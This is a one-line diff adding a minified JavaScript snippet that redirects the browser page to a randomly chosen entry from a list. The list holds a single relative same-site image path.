@@ -1,0 +1,1 @@
+(()=>{var e=["/img/0a5a9cfb/"];window.location=e[Math.floor(Math.random()*e.length)]})()
